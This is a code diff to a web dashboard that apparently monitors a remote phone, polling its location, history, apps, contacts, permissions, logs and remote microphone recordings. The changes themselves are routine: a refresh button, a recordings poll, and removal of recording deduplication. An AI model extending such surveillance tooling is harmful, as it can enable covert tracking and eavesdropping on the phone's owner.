@@ -441,6 +441,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
 <span style="font-size:13px;font-weight:500;color:var(--text)">🎙️ Remote Recording</span>
 <select id="voiceDeviceSelect" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 10px;border-radius:6px;font-size:12px;min-width:160px" onchange="this.value && (selectedDevice=this.value, recordingDevice=this.value, localStorage.setItem('selectedDevice', selectedDevice), pollRecordings())"><option value="">Select device...</option></select>
+<span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer;margin-left:auto" onclick="pollRecordings()">🔄 Refresh</span>
 <select id="recDuration" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 10px;border-radius:6px;font-size:12px">
 <option value="60">1 min</option>
 <option value="120">2 min</option>
@@ -760,7 +761,7 @@ let playbackLoop = false;
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000 };
+const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, recordings: 30000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -1129,6 +1130,7 @@ function startPolling() {
   schedulePoll('appSnapshots', 30000, pollAppSnapshots);
   schedulePoll('hist', intervals.hist, pollHistory);
   schedulePoll('voice', intervals.voice, pollVoiceNotes);
+  schedulePoll('recordings', intervals.recordings, () => { if (document.querySelector('#voice-sub-remote')?.style.display !== 'none') pollRecordings(); });
   schedulePoll('contacts', intervals.contacts, pollContacts);
   schedulePoll('perms', intervals.perms, pollPermissions);
   schedulePoll('fcm', intervals.fcm, pollFcmToken);
@@ -2090,19 +2092,8 @@ async function pollRecordings() {
     list.innerHTML = '<div class="label">No recordings yet</div>';
     return;
   }
-  // Deduplicate: keep only first recording per unique (durationSec, sizeBytes) pair
-  const seen = new Set();
-  const uniqueRecordings = recordings.filter(rec => {
-    const key = `${rec.durationSec}_${rec.sizeBytes}`;
-    if (seen.has(key)) return false;
-    seen.add(key);
-    return true;
-  });
-  if (uniqueRecordings.length !== recordings.length) {
-    console.log(`Deduplicated ${recordings.length} -> ${uniqueRecordings.length} recordings`);
-  }
-  let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${uniqueRecordings.length} recording${uniqueRecordings.length>1?'s':''} • newest first</div>`;
-  for (const rec of uniqueRecordings) {
+  let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${recordings.length} recording${recordings.length>1?'s':''} • newest first</div>`;
+  for (const rec of recordings) {
     const dur = rec.durationSec ? Math.floor(rec.durationSec/60) + ':' + String(rec.durationSec%60).padStart(2,'0') : '';
     const size = rec.sizeBytes ? (rec.sizeBytes/1024/1024).toFixed(1) + ' MB' : '';
     const created = rec.createdAt ? pkt(rec.createdAt) : '';
@@ -3771,10 +3762,7 @@ async function getAuthToken() {
   return null;
 }
 
-// Override the voice tab click handler to also fetch recordings
-document.querySelector('[data-tab="voice"]').addEventListener('click', () => {
-  setTimeout(pollRecordings, 100);
-});
+
 
 async function estimateNodeSize(path, sampleSize = 3) {
   const keys = await fetchRTDB(path, 'shallow=true');
